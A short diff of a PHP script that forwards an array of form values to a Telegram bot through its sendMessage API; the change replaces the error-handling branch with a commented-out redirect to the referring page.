@@ -17,9 +17,9 @@ foreach($arr as $key => $value){
 
 $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
 
-if ($sendToTelegram){
-
-}else {
-  echo "Error";
-}
+// if(isset($_SERVER['HTTP_REFERER'])){
+//   header("Location: " . $_SERVER['HTTP_REFERER']);    
+// } else {
+//   echo "An Error";
+// }
 ?>
